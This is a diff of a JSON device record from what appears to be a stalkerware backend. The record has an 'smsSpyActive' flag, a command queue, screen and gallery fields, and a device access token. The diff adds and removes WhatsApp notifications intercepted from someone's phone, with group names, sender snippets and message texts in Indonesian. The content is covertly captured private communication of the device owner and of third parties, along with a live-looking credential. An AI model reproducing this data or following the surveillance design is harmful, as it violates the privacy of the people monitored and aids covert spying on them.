@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777173742689,
+    "lastSeen": 1777173754460,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (113 pesan): ~ adalah pokoknya 😛",
+        "content": "Izin off princes nak turu syantik",
+        "time": "26/04 11:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173755042
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1292 pesan dari 19 chat",
+        "time": "26/04 11:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777173743312
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎[𝐃𝐖𝐁] 𝐃𝐀𝐄𝐑𝐀𝐇 𝐖𝐎𝐍𝐆 𝐁𝐀𝐂𝐎𝐓 || 𝐍𝐄𝐖 𝐄𝐑𝐀 (115 pesan): ~ pia?",
@@ -4003,22 +4019,6 @@
         "time": "26/04 11:21",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173048408
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (125 pesan): ~ 🦨",
-        "content": "📷 Foto",
-        "time": "26/04 11:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173048361
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (33 pesan): ~ qɪs†",
-        "content": "💟 Stiker",
-        "time": "26/04 11:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173038822
       }
     ],
     "galleryPhotos": [],
